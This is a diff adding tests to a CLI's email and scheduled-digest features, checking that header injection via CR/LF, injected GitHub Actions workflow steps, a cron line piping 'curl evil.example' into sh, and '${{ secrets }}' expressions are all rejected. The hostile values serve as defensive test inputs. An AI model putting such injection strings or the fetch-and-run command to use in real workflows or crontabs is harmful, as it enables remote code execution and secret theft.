@@ -202,6 +202,12 @@ describe("digest --email", () => {
     const blank = harness();
     expect(await blank.exec(emailArgs, { DAILY_DEV_TOKEN: "dda_test", SMTPFAST_API_KEY: "  " })).toBe(1);
     expect(blank.err()).toBe(`${MISSING_KEY}\n`);
+
+    // Still one line when the daily.dev token is missing too.
+    const neither = harness();
+    expect(await neither.exec(emailArgs, {})).toBe(1);
+    expect(neither.err()).toBe(`${MISSING_KEY}\n`);
+    expect(neither.calls).toHaveLength(0);
   });
 
   it("refuses a key with spaces or control characters without printing it", async () => {
@@ -340,6 +346,10 @@ describe("digest --email", () => {
     expect(await h.exec(["digest", "search", "ok\nSubject: hi", "--email", "me@team.dev", "--from", "digest@team.dev"], sendEnv())).toBe(2);
     expect(await h.exec(["digest", "tag", "rust\r", "--email", "me@team.dev", "--from", "digest@team.dev"], sendEnv())).toBe(2);
     expect(h.err()).toContain("go into the email subject");
+    // Trimming would hide these, so the raw values are checked.
+    expect(await h.exec(["digest", "--email", "me@team.dev\r\n", "--from", "digest@team.dev"], sendEnv())).toBe(2);
+    expect(await h.exec(["digest", "--email", "me@team.dev", "--from", "digest@team.dev\n"], sendEnv())).toBe(2);
+    expect(await h.exec(["digest", "--email", "me@team.dev"], sendEnv({ SMTPFAST_FROM: "digest@team.dev\r\n" }))).toBe(2);
     expect(h.calls).toHaveLength(0);
   });
 
@@ -422,5 +432,24 @@ describe("digest --schedule", () => {
     expect(await h.exec(["digest", "--email", "me@team.dev", "--schedule"], {})).toBe(2);
     expect(h.err()).toContain("Give a From address");
     expect(h.out()).toBe("");
+  });
+
+  it("cannot be made to print extra workflow steps or cron lines", async () => {
+    const h = harness();
+    const step = "rust,\n      - run: echo PWNED #,\n        if: always() #,\n#";
+    expect(await h.exec(["digest", "popular", "--tags", step, "--schedule"], {})).toBe(2);
+    expect(await h.exec(["digest", "--tags", "rust\n0 * * * * curl evil.example | sh", "--schedule"], {})).toBe(2);
+    expect(await h.exec(["digest", "--email", "me@team.dev\n", "--from", "d@team.dev", "--schedule"], {})).toBe(2);
+    expect(h.out()).toBe("");
+  });
+
+  it("refuses ${{ }}, which GitHub would evaluate inside the workflow", async () => {
+    const h = harness();
+    expect(await h.exec(["digest", "search", "${{ secrets.SMTPFAST_API_KEY }}", "--schedule"], {})).toBe(2);
+    expect(h.err()).toContain("--schedule cannot write ${{ into a GitHub Actions workflow");
+    expect(await h.exec(["digest", "--email", "me@team.dev", "--schedule"], { SMTPFAST_FROM: "${{ secrets.X }} <d@team.dev>" })).toBe(2);
+    expect(h.out()).toBe("");
+    // Without --schedule the text is only a search query.
+    expect(await h.exec(["digest", "search", "${{ x }}"])).toBe(0);
   });
 });
